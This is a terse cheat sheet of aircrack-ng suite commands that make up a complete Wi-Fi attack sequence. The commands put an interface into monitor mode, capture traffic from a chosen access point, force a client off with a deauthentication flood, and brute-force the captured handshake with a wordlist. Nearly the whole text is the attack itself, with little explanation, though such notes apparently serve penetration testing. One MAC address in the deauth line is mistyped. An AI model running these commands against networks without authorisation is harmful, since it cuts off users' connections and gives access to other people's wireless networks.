# Aircrack

## Aircrack&#x20;

### Enable/list interface&#x20;

```csharp
airmon-ng start wlx00c0ca9020a9
```

### Kill process&#x20;

```csharp
 airmon-ng check kill
```

### Listen for wifi&#x20;

```
 airodump wlan0mon
```

### Grab a network&#x20;

```csharp
airodump-ng -c 1 -w w1 --bssid 12:33:44:55:66:77 wlan0mon
```

### Dessassociate a client&#x20;

```csharp
aireplay-ng -0 0 -a 012:33:44:55:66:77 -c 94:65:2D:11:22:33 wlan0mon
```

### Sniff and get pcap

Then aircrack :)

### bruteforcing

```csharp
aircrack-ng -w w.t w1-02.cap
```



## Resources

